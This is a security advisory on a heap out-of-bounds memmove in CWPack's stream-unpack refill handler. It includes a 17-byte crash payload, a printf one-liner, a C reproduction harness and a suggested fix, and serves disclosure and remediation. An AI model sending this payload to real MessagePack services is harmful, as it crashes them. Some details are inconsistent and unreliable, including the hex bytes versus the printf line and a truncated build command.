Security Advisory · discovered by Nemesis Forge

Heap out-of-bounds (negative-size memmove) in CWPack's stream-unpack refill handler

A truncated or length-lying MessagePack stream drives the parse cursor past the buffer end, causing the next refill to call memmove with a negative (huge) size — a reliable remote crash reachable through CWPack's simplest documented stream-decode loop.

01 Summary

CWPack ships ready-to-use "contexts" under goodies/basic-contexts/, including a stream unpack context that decodes MessagePack from a FILE*, refilling a fixed-size buffer on demand via handle_stream_unpack_underflow. This is the documented, canonical way to stream-decode with CWPack, and applications commonly use it verbatim.

The refill handler calls fread to top up its buffer but only checks whether it read zero bytes — it never verifies it obtained the number of bytes the parser requested. On a short read (a truncated message, or a blob header that lies about its length), the handler returns success anyway. The core parser then advances its read cursor by the full requested amount, pushing current past end. On the next refill, remains = end - current underflows to a huge unsigned value and is handed to memmove — an unbounded copy from a pointer that is already out of bounds.

An attacker who can supply MessagePack bytes to an app using the stream context needs only one small message: declare a string longer than the stream actually contains.

p   = unpack_context->current;
nyp = p + more;
if (nyp > unpack_context->end) {
    int rc = unpack_context->handle_unpack_underflow(unpack_context, (unsigned long)(more));
    ...                              // rc == CWP_RC_OK is trusted as "more bytes are now available"
    p = unpack_context->current; nyp = p + more;
}
unpack_context->current = nyp;       // (C') advances by `more` unconditionally → past end after a short read

The core assumes a CWP_RC_OK return means more bytes are now present between current and end. The stream handler returns CWP_RC_OK after reading any non-zero number of bytes. When the input declares a blob larger than the remaining stream:

  1. fread returns l with 0 < l < more (short read — C).
  2. Handler returns CWP_RC_OK (B) with end = start + remains + l.
  3. Core sets current = current + more (C'), so current > end.
  4. The next parse step calls the handler again; now remains = (unsigned long)(end - current) (A) is a small negative difference reinterpreted as size_t — a huge value.
  5. memmove(start, current, remains) (D) executes with that size → out-of-bounds.

This is a self-contained defect in the refill handler's short-read handling. It is unrelated to CWPack issue #22 (a 32-bit pointer-arithmetic wrap in the core macro), which its author states "does not involve handle_stream_unpack_underflow or fread short reads."

03 Proof-of-concept payload

The minimal trigger is 17 bytes — a fixstr header declaring a 22-byte string followed by only 16 bytes. No base64, Python, or fuzzer required:

b6 ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff 05
BytesMessagePack meaning
b6fixstr header, declared length 0x16 & 0x1f = 22 bytes
following 16 bytesthe string "payload" — but only 16 present, not the declared 22

create it — one line, anyone can run

printf '\xb6\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff' > crash.bin

The 16 filler bytes are arbitrary; only the count (fewer than the declared 22) matters. The vulnerability is general — for any buffer size, a declared blob length exceeding the remaining stream bytes drives current past end.

04 Reproduction

poc.c — the simplest documented stream-unpack loop, no tricks

#include <stdio.h>
#include <string.h>
#include "basic_contexts.h"

int main(int argc, char** argv) {
    FILE* f = fopen(argv[1], "rb");
    if (!f) return 0;
    stream_unpack_context suc;
    memset(&suc, 0, sizeof(suc));
    init_stream_unpack_context(&suc, 16, f);   /* small buffer forces the refill path */
    while (suc.uc.return_code == CWP_RC_OK)
        cw_unpack_next((cw_unpack_context*)&suc);
    terminate_stream_unpack_context(&suc);
    fclose(f);
    return 0;
}

build (any clang with AddressSanitizer; libFuzzer NOT required) & run

git clone https://github.com/clwi/CWPack

  -ICWPack/goodies/basic-contexts -ICWPack/src \

05 Risk & severity

Where it bites

Any point where untrusted MessagePack reaches a stream_unpack_context:

  • Network services speaking MessagePack over a socket/pipe (FILE*) — RPC, IoT/telemetry, game servers. One malformed frame from an unauthenticated peer crashes the decoder.
  • File / message parsers decoding MessagePack from disk or a queue — a poisoned file crashes the consumer on open.
  • Embedded / edge devices — CWPack's stated niche; a crash is a hard fault and recovery may mean a reboot.

Impact tiers

Availability (DoS)ConfirmedDeterministic heap OOB memmove → immediate crash. One small message downs the process. Repeatable at will.

07 Suggested fix

Treat a partial read as underflow, not success — fill until the requested bytes are actually available, or fail cleanly:

/* fill until we actually have `more` bytes available, or EOF/err */
while ((unsigned long)(uc->end - uc->current) < more)
{
    unsigned long want = suc->buffer_length - (unsigned long)(uc->end - uc->start);
    unsigned long l = fread(uc->end, 1, want, suc->file);
    if (!l)
    {
        if (feof(suc->file))  return CWP_RC_END_OF_INPUT;
        suc->uc.err_no = ferror(suc->file);
        return CWP_RC_ERROR_IN_HANDLER;
    }
    uc->end += l;
}

Defense in depth: in cw_unpack_assert_space_sub, after the handler returns CWP_RC_OK, assert current + more <= end before advancing, so any non-conforming custom handler cannot push the cursor past end.
